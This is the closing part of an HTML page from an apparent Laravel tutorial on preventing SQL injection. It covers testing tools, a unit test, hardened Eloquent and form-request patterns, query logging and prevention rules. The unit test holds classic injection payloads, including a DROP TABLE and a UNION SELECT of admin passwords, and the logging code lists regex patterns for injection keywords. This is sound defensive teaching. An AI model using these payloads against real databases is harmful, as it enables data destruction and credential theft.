+<ul class="space-y-2 my-4 text-[15px] text-ink-secondary dark:text-dark-muted list-disc list-inside">
+<li><strong>SQLMap</strong>: Automated SQL injection testing</li>
+<li><strong>OWASP ZAP</strong>: Web application security scanner</li>
+<li><strong>Burp Suite</strong>: Manual and automated testing</li>
+<li><strong>sqlninja</strong>: Microsoft SQL Server specific</li>
+</ul>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Unit Testing</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+class SQLInjectionTest extends TestCase
+{
+    public function testSQLInjectionPrevention()
+    {
+        // Test various injection payloads
+        $maliciousInputs = [
+            &quot;1' OR '1'='1&quot;,
+            &quot;1; DROP TABLE users; --&quot;,
+            &quot;1 UNION SELECT password FROM admin&quot;,
+        ];
+
+        foreach ($maliciousInputs as $input) {
+            $stmt = $this-&gt;pdo-&gt;prepare(&quot;SELECT * FROM users WHERE id = ?&quot;);
+            $stmt-&gt;execute([$input]);
+            $result = $stmt-&gt;fetch();
+
+            $this-&gt;assertNull($result, &quot;SQL injection not prevented for input: {$input}&quot;);
+        }
+    }
+}
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Laravel Security Best Practices</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">1. Use Eloquent Relationships</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+// [SECURE]: Eloquent relationships prevent injection
+class Post extends Model
+{
+    public function user()
+    {
+        return $this-&gt;belongsTo(User::class);
+    }
+}
+
+// Safe relationship queries
+$posts = Post::where('user_id', $userId)-&gt;with('user')-&gt;get();
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">2. Use Route Model Binding</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="chip-emerald font-bold text-[11px]">[SECURE] Hardened Pattern</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+// [SECURE]: Laravel automatically validates and finds model
+Route::get('/users/{user}', function (User $user) {
+    // $user is automatically resolved and validated
+    return $user;
+});
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">3. Use Form Requests for Complex Validation</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+class UpdateUserRequest extends FormRequest
+{
+    public function rules()
+    {
+        return [
+            'id' =&gt; 'required|integer|exists:users,id',
+            'name' =&gt; 'required|string|max:255',
+            'email' =&gt; 'required|email|unique:users,email,' . $this-&gt;id,
+        ];
+    }
+
+    public function authorize()
+    {
+        return $this-&gt;user()-&gt;can('update', User::find($this-&gt;id));
+    }
+}
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Monitoring and Logging</h2>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Log Suspicious Activity</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">&lt;?php
+function logSuspiciousSQL($query, $params, $ip) {
+    $suspiciousPatterns = [
+        '/;\s*drop/i',
+        '/union\s+select/i',
+        '/information_schema/i',
+        '/load_file/i',
+        '/into\s+outfile/i',
+    ];
+
+    foreach ($suspiciousPatterns as $pattern) {
+        if (preg_match($pattern, $query)) {
+            error_log(&quot;Suspicious SQL detected from {$ip}: {$query}&quot;);
+            // Could also send alerts or block IP
+            break;
+        }
+    }
+}
+</code></pre>
+</div>
+<h3 class="text-xl font-bold text-ink dark:text-white mt-8 mb-3 tracking-tight">Database Query Logging</h3>
+<div class="code-container my-6">
+  <div class="code-header">
+    <span class="font-mono text-xs text-[#A39E98]">PHP / Laravel Code</span>
+    <button type="button" class="code-copy-btn">Copy</button>
+  </div>
+  <pre><code class="language-php">// Laravel query logging
+DB::listen(function ($query) {
+    Log::info('SQL Query', [
+        'sql' =&gt; $query-&gt;sql,
+        'bindings' =&gt; $query-&gt;bindings,
+        'time' =&gt; $query-&gt;time,
+    ]);
+});
+</code></pre>
+</div>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Summary: SQL Injection Prevention Rules</h2>
+<ol class="space-y-2 my-4 text-[15px] text-ink-secondary dark:text-dark-muted list-decimal list-inside">
+<li><strong>Never concatenate user input into SQL queries</strong></li>
+<li><strong>Always use prepared statements with parameter binding</strong></li>
+<li><strong>Use allow-lists for dynamic table/column names</strong></li>
+<li><strong>Validate and sanitize all input before database operations</strong></li>
+<li><strong>Use ORM features (Eloquent) when possible</strong></li>
+<li><strong>Implement proper error handling without exposing information</strong></li>
+<li><strong>Log and monitor database queries for suspicious activity</strong></li>
+<li><strong>Keep database drivers and frameworks updated</strong></li>
+<li><strong>Use least privilege database accounts</strong></li>
+<li><strong>Regular security testing and code reviews</strong></li>
+</ol>
+<h2 class="text-2xl font-bold text-ink dark:text-white mt-10 mb-4 pb-2 border-b border-surface-hairline dark:border-dark-border tracking-tight">Next Steps</h2>
+<p class="text-ink-secondary dark:text-dark-muted leading-relaxed my-3.5 text-[15px]">Now that you understand SQL injection prevention, explore:</p>
+<ul class="space-y-2 my-4 text-[15px] text-ink-secondary dark:text-dark-muted list-disc list-inside">
+<li><strong><a href="/security/laravel/input-handling.html">Input Handling</a></strong> - Learn about input validation and sanitization</li>
+<li><strong><a href="/security/laravel/password-handling.html">Authentication &amp; Password Handling</a></strong> - Secure user authentication</li>
+<li><strong><a href="/security/laravel/secure-coding-basics.html">Secure Coding Basics</a></strong> - Overall security principles</li>
+</ul>
+<p class="text-ink-secondary dark:text-dark-muted leading-relaxed my-3.5 text-[15px]">Remember: SQL injection is one of the most dangerous vulnerabilities. Always use prepared statements and never trust user input!</p>
+    </div>
+
+    <!-- Ask AI Assistant Row -->
+    <div class="my-10 p-6 rounded-md border border-surface-hairline dark:border-dark-border bg-surface-warm dark:bg-dark-card flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
+      <div>
+        <div class="text-[11px] font-bold uppercase tracking-wider text-ink-muted mb-1">AI Assistant Shortcuts</div>
+        <div class="text-sm font-semibold text-ink dark:text-white">Ask AI about this topic</div>
+      </div>
+      <div class="flex flex-wrap items-center gap-2">
+        <a href="https://chatgpt.com/?q=SQL+Injection+Prevention+Laravel+security+best+practices+techtalks.itsumarfarooq.com" target="_blank" rel="noopener noreferrer" class="button-white text-xs">
+          ChatGPT &nearr;
+        </a>
+        <a href="https://www.perplexity.ai/search?q=SQL+Injection+Prevention+Laravel+PHP+8.4+techtalks.itsumarfarooq.com" target="_blank" rel="noopener noreferrer" class="button-white text-xs">
+          Perplexity &nearr;
+        </a>
+        <a href="https://claude.ai/new?q=Explain+SQL+Injection+Prevention+in+Laravel+applications+techtalks.itsumarfarooq.com" target="_blank" rel="noopener noreferrer" class="button-white text-xs">
+          Claude &nearr;
+        </a>
+      </div>
+    </div>
+
+    <!-- Navigation -->
+    <div class="flex items-center justify-between border-t border-surface-hairline dark:border-dark-border pt-6 my-10">
+      <div><a href="/security/laravel/input-handling.html" class="button-secondary text-xs flex items-center gap-1.5">&larr; Prev: Input Handling &amp; Sanitization</a></div>
+      <div><a href="/security/laravel/xss-protection.html" class="button-primary text-xs flex items-center gap-1.5">Next: Cross-Site Scripting (XSS) Defense &rarr;</a></div>
+    </div>
+
+    <!-- Author Card -->
+    <div class="card-standard p-6 mt-12 bg-white dark:bg-dark-card border border-surface-hairline dark:border-dark-border shadow-soft print:hidden">
+      <div class="flex flex-col sm:flex-row items-start sm:items-center gap-5">
+        <div class="w-14 h-14 rounded-full bg-gradient-to-tr from-primary to-primary-pressed flex items-center justify-center text-white text-lg font-bold shrink-0 shadow-soft">
+          UF
+        </div>
+        <div>
+          <h3 class="text-base font-bold text-ink dark:text-white">Curated by Umar Farooq</h3>
+          <p class="text-xs text-ink-secondary dark:text-dark-muted mt-1 leading-relaxed max-w-2xl">
+            Senior Full-Stack &amp; Security Engineer with 5+ years of production experience in Laravel, PHP, and modern web application security. Author of the Laravel AI Security Masterclass.
+          </p>
+          <div class="flex flex-wrap items-center gap-3 mt-3 text-xs font-medium">
+            <a href="mailto:contact@itsumarfarooq.com" class="text-ink-secondary dark:text-dark-muted hover:text-primary transition-colors">Email</a>
+            <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+            <a href="https://itsumarfarooq.com" target="_blank" rel="noopener noreferrer" class="text-primary hover:underline">Portfolio</a>
+            <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+            <a href="https://github.com/umar-444" target="_blank" rel="noopener noreferrer" class="text-ink-secondary dark:text-dark-muted hover:text-primary transition-colors">GitHub</a>
+            <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+            <a href="https://x.com/umartechtalks" target="_blank" rel="noopener noreferrer" class="text-ink-secondary dark:text-dark-muted hover:text-primary transition-colors">X.com</a>
+            <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+            <a href="https://linkedin.com/in/umar444" target="_blank" rel="noopener noreferrer" class="text-ink-secondary dark:text-dark-muted hover:text-primary transition-colors">LinkedIn</a>
+            <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+            <a href="https://worldwebtree.com" target="_blank" rel="noopener noreferrer" class="text-ink-secondary dark:text-dark-muted hover:text-primary transition-colors">Company (Worldwebtree)</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="mt-auto border-t border-surface-hairline dark:border-dark-border bg-white dark:bg-dark-bg py-12 text-xs text-ink-secondary dark:text-dark-muted print:hidden">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6">
+      <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 pb-8 border-b border-surface-hairline dark:border-dark-border">
+        <div>
+          <a href="/" class="flex items-center gap-2 font-bold text-sm text-ink dark:text-white">
+            <span class="w-6 h-6 rounded-xs bg-primary flex items-center justify-center text-white text-xs font-bold">UT</span>
+            <span>Umar<span class="text-primary">TechTalks</span></span>
+          </a>
+          <p class="text-xs text-ink-secondary dark:text-dark-muted mt-1.5 max-w-sm leading-relaxed">
+            Production web security, engineering standards, and AI defense masterclasses curated by Umar Farooq.
+          </p>
+        </div>
+
+        <div class="flex flex-wrap items-center gap-x-5 gap-y-2 text-xs font-medium">
+          <a href="mailto:contact@itsumarfarooq.com" class="hover:text-primary transition-colors">contact@itsumarfarooq.com</a>
+          <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+          <a href="https://itsumarfarooq.com" target="_blank" rel="noopener noreferrer" class="hover:text-primary transition-colors">itsumarfarooq.com</a>
+          <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+          <a href="https://x.com/umartechtalks" target="_blank" rel="noopener noreferrer" class="hover:text-primary transition-colors">@umartechtalks</a>
+          <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+          <a href="https://linkedin.com/in/umar444" target="_blank" rel="noopener noreferrer" class="hover:text-primary transition-colors">LinkedIn</a>
+          <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+          <a href="https://github.com/umar-444" target="_blank" rel="noopener noreferrer" class="hover:text-primary transition-colors">GitHub</a>
+          <span class="text-surface-hairline dark:text-dark-border">&bull;</span>
+          <a href="https://worldwebtree.com" target="_blank" rel="noopener noreferrer" class="hover:text-primary transition-colors">Worldwebtree.com</a>
+        </div>
+      </div>
+
+      <div class="flex flex-col sm:flex-row items-center justify-between gap-4 pt-6 text-[11px] text-ink-muted">
+        <p>&copy; 2026 Umar Farooq &bull; All rights reserved.</p>
+        <p>Independent security educational initiative. Not affiliated with Laravel LLC or Taylor Otwell.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
